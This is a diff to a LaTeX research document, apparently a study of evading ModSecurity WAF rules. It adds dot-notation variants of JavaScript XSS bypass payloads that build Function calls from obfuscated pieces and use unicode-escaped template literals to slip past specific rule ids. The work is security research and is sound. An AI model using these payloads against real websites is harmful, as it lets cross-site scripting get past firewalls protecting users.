@@ -99,8 +99,14 @@ The basic implementation was blocked by the ModSecurity firewall:
 
 To evade rule with id \verb|934100|, calling the \verb|Function()| constructor was substituted with \verb|[]['constructor']['constructor']()|. Using string concatenation to replace the character sequence \verb|'prompt'| with \verb|'promp + t'| successfully made the payload evade rule \verb|941390| and bypass the WAF. The bypassing payload:
 
-\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload]
+\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using square bracket notation]
 []['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')()
+\end{lstlisting}
+
+Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall: 
+
+\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using dot notation]
+[].constructor.constructor('var s = "secret";promp' + 't("something", s)')()
 \end{lstlisting}
 
 \subsubsection{Avoiding ()}
@@ -119,8 +125,14 @@ Considering the bypassing payload from \ref{sec:funconstrconbypass}, opening and
 
 Evading rule \verb|932130| was possible by using a form of unicode escaping in JavaScript that was introduced with ES6 and differs from the unicode escaping in JSON. The character sequence \verb|${s}| was replaced with \verb|\u{0024}{s}|. This made the payload bypass the ModSecurity firewall. The bypassing payload:
 
-\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload]
+\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using square bracket notation]
 []['constructor']['constructor']`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
+\end{lstlisting}
+
+Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall: 
+
+\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using dot notation]
+[].constructor.constructor`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
 \end{lstlisting}
 
 It is conspicuous that the payload could bypass the firewall with only the later \verb|$| of the two placeholders: \verb|${expression}| escaped.
@@ -153,12 +165,17 @@ A payload thats not using any \verb|{}| but still allows for Tagged Template Lit
 
 On using a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of
 
-\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload, label={lst:stringreplacepass}]
+\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using square bracket notation, label={lst:stringreplacepass}]
 [][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
 \end{lstlisting}
 
 successfully evaded the firewall.
 
+Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall: 
+
+\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using dot notation, label={lst:stringreplacepass}]
+[].constructor.constructor('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
+\end{lstlisting}
 
 
 
